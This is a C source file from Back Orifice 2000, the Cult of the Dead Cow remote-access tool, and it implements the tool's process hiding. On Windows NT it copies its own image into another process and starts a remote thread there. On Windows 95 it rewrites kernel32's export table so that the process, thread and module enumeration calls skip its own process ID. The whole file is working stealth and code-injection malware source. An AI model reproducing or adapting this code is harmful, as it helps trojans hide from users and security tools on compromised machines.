/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<main.h>
#include<bo_debug.h>
#include<functions.h>
#include<osversion.h>
#include<dll_load.h>
#include<pviewer.h>
#include<process_hop.h>
#include<config.h>

// --------------------- Code to hide Win95 processes ----------------------

void __declspec(naked) StartOfHappyCode(void)
{
}

BOOL WINAPI FakeProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	if(((PROCESSWALK)0x22222222)(hSnapshot, lppe)==FALSE) return FALSE;
	while(lppe->th32ProcessID==0x11111111) {
		if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	while(lppe->th32ProcessID==0x11111111) {
		if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeThread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
{
	if(((THREADWALK)0x44444444)(hSnapshot, lpte)==FALSE) return FALSE;
	while(lpte->th32OwnerProcessID==0x11111111) {
		if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeThread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
{
	if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	while(lpte->th32OwnerProcessID==0x11111111) {
		if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeModule32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	if(((MODULEWALK)0x66666666)(hSnapshot, lpme)==FALSE) return FALSE;
	while(lpme->th32ProcessID==0x11111111) {
		if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeModule32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	while(lpme->th32ProcessID==0x11111111) {
		if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	}
	return TRUE;
}

void __declspec(naked) EndOfHappyCode(void)
{
}



BOOL SpawnBO2KThread(char *svProcess)
{	
	if(g_bIsWinNT) {  //---------------------- WINDOWS NT PROCESS HIDE -------------------
		// -------------------------------------------------------
		// -- Process Hiding Code                               
		// -- Note that there are several different ways to do  
		// -- what this code does. Both of the methods presented
		// -- below were written specifically to avoid accessing
		// -- the original BO2K image on disk.
		// -- This way, the original BO2K disk file can be compressed
		// -- with all of the plugin attachments inside, and
		// -- the original executable can be moved around/deleted
		// -- while the BO2K server still runs.
		
		// Get another process and thread id
		PROCESSINFO *ppie,*ppi=CreateProcListSnapshot(NULL);
		DWORD dwThreadID, dwProcID;
		
		for(ppie=ppi;ppie!=NULL;ppie=ppie->next) {
			if(lstrcmpi(ppie->svApp,svProcess)==0) break;
		}
		if(ppie==NULL) return FALSE;
		
		dwProcID=ppie->dwProcID;
		dwThreadID=ppie->pThread->dwThreadID; // Get first thread (doesn't really matter)
		
		DestroyProcListSnapshot(ppi);
		
		// Make sure we aren't hopping into ourselves
		if(GetCurrentProcessId()==dwProcID) return FALSE;

		// Open process to inject code into
		HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcID);
		if(hProc==NULL) {
			DebugMessageBox(NULL,"Unable to open process","ERROR",MB_SETFOREGROUND);
			return FALSE;
		}
		
		// Free space for BO2K (in case we are restarting)
		pVirtualFreeEx(hProc,g_module,0,MEM_RELEASE);
		
		// Allocate space for BO2K to fit in the process
		DWORD dwSize=((PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET(g_module))->SizeOfImage;
		char *pMem=(char *)pVirtualAllocEx(hProc,g_module,dwSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
		if(pMem==NULL) {
			DebugMessageBox(NULL,"Couldn't VirtualAllocEx","Error",MB_SETFOREGROUND);
			return FALSE;
		}
		
		// Lets copy the entire bo2k process into this space.
		DWORD dwOldProt,dwNumBytes,i;
		MEMORY_BASIC_INFORMATION mbi;
		
		pVirtualQueryEx(hProc,pMem,&mbi,sizeof(MEMORY_BASIC_INFORMATION));
		while(mbi.Protect!=PAGE_NOACCESS && mbi.RegionSize!=0) {
			if(!(mbi.Protect & PAGE_GUARD)) {
				for(i=0;i<mbi.RegionSize;i+=0x1000) {
					pVirtualProtectEx(hProc,pMem+i,0x1000,PAGE_EXECUTE_READWRITE,&dwOldProt);
					WriteProcessMemory(hProc,pMem+i,pMem+i,0x1000,&dwNumBytes);
				}
			}
			
			pMem+=mbi.RegionSize;
			pVirtualQueryEx(hProc,pMem,&mbi,sizeof(MEMORY_BASIC_INFORMATION));	
		}
		
		// Create a remote thread in the other process
		DWORD dwRmtThdID;
		HANDLE hRmtThd=pCreateRemoteThread(hProc,NULL,0,EntryPoint,(LPVOID)g_module,0,&dwRmtThdID);
		if(hRmtThd==NULL) {
			DebugMessageBox(NULL,"Could create remote thread","ERROR",MB_SETFOREGROUND);
			return FALSE;
		}
		
		CloseHandle(hProc);
		return 0;
		
	} else { //---------------------------------- WINDOWS 95 PROCESS HIDE -------------
		// This one works differently because we don't necessarily have
		// the functionality to do a 'CreateRemoteThread()'. And for 
		// various reasons, hijacking another thread and changing its
		// context to do your bidding doens't really work. It's because
		// the thread you hijack may be blocked on a mutex/semaphore/etc
		// and won't resume execution to run your code until the blocking
		// ID is signaled by the system. So, we have to just hack kernel32.dll
		// to forget that our process exists :)

		// Start up PE Image Loader

		pRegisterServiceProcess(NULL,1);
	
		// Get undocumented VxDCall procedure
		HMODULE hModule=GetModuleHandle("kernel32.dll");
		FARPROC VxDCall=GetDLLProcAddress(hModule,(LPCSTR)1);
		
		// Check for kernel32.dll export table
		PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET(hModule);
		DWORD dwSize=poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if(dwSize==0) return NULL;

		// Good, we have an export table. Lets get it.
		PIMAGE_EXPORT_DIRECTORY ped;
		ped=(IMAGE_EXPORT_DIRECTORY *)RVATOVA(hModule,poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);	
	
		// Change protection on kernel32.dll export table (make writable)
		// (can't use "VirtualProtect")
		DWORD dwFirstPage, dwNumPages;
		dwFirstPage=((DWORD)RVATOVA(hModule,ped->AddressOfFunctions))/4096;
		dwNumPages=(((ped->NumberOfFunctions)*4)+4095)/4096;
		
		_asm {	
			push 020060000h                 // PC_WRITEABLE | PC_USER | PC_STATIC
			push 0FFFFFFFFh                 // Keep all previous bits
			push dword ptr [dwNumPages]     // dword ptr [mbi+0Ch] # of pages
			push dword ptr [dwFirstPage]    // dword ptr [ped] page #
			push 1000Dh						// _PageModifyPermissions (win32_service_table #)
			call dword ptr [VxDCall]		// VxDCall0
		}
		
		// Fix kernel32.dll export table if I happened to fuck things
		// up earlier (run bo2k, crash out, and restart)

		SpawnCleanup();

		InitializeDLLLoad();
		
		// Get shared memory
		DWORD dwCodeSize=((DWORD)&EndOfHappyCode) - ((DWORD)&StartOfHappyCode);
		LPVOID lpBase;
		lpBase=VirtualAlloc((LPVOID)0x9CDC0000,dwCodeSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
		if(lpBase!=(LPVOID)0x9CDC0000) lpBase=(LPVOID)0x9CDC0000;

		// Copy code into shared memory
		memcpy(lpBase,(void *)(&StartOfHappyCode),dwCodeSize);

		// Store procedure addresses
		DWORD dwOldAddress[6],dwCurPid;
		dwCurPid=GetCurrentProcessId();
		dwOldAddress[0]=(DWORD)GetDLLProcAddress(hModule,"Process32First");
		dwOldAddress[1]=(DWORD)GetDLLProcAddress(hModule,"Process32Next");
		dwOldAddress[2]=(DWORD)GetDLLProcAddress(hModule,"Thread32First");
		dwOldAddress[3]=(DWORD)GetDLLProcAddress(hModule,"Thread32Next");
		dwOldAddress[4]=(DWORD)GetDLLProcAddress(hModule,"Module32First");
		dwOldAddress[5]=(DWORD)GetDLLProcAddress(hModule,"Module32Next");

		// Modify code to correct addresses
		DWORD i;
		for(i=0;i<(dwCodeSize-4);i++) {
			DWORD *dwPtr=(DWORD *)((BYTE *)lpBase+i);
			if     (*dwPtr==0x11111111) *dwPtr=dwCurPid;
			else if(*dwPtr==0x22222222) *dwPtr=(DWORD)dwOldAddress[0];
			else if(*dwPtr==0x33333333) *dwPtr=(DWORD)dwOldAddress[1];
			else if(*dwPtr==0x44444444) *dwPtr=(DWORD)dwOldAddress[2];
			else if(*dwPtr==0x55555555) *dwPtr=(DWORD)dwOldAddress[3];
			else if(*dwPtr==0x66666666) *dwPtr=(DWORD)dwOldAddress[4];
			else if(*dwPtr==0x77777777) *dwPtr=(DWORD)dwOldAddress[5];
		}		

		// Now we modify the export table to point to our replacement code

		SetDLLProcAddress(hModule,"Process32First",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeProcess32First)));
		SetDLLProcAddress(hModule,"Process32Next",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeProcess32Next)));
		SetDLLProcAddress(hModule,"Thread32First",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeThread32First)));
		SetDLLProcAddress(hModule,"Thread32Next",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeThread32Next)));
		SetDLLProcAddress(hModule,"Module32First",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeModule32First)));
		SetDLLProcAddress(hModule,"Module32Next",(FARPROC)RVATOVA(lpBase,VATORVA(&StartOfHappyCode,(FARPROC)&FakeModule32Next)));

		// Done with dll_load
		KillDLLLoad();

		EntryPoint(GetModuleHandle(NULL));
		
		SpawnCleanup();

	}

	return TRUE;
}	

void SpawnCleanup(void)
{
	if(!g_bIsWinNT) {
		InitializeDLLLoad();
		HMODULE hModule=GetModuleHandle("kernel32.dll");

		ResetDLLProcAddress(hModule,"Process32First");
		ResetDLLProcAddress(hModule,"Process32Next");
		ResetDLLProcAddress(hModule,"Thread32First");
		ResetDLLProcAddress(hModule,"Thread32Next");
		ResetDLLProcAddress(hModule,"Module32First");
		ResetDLLProcAddress(hModule,"Module32Next");
		KillDLLLoad();
	}
}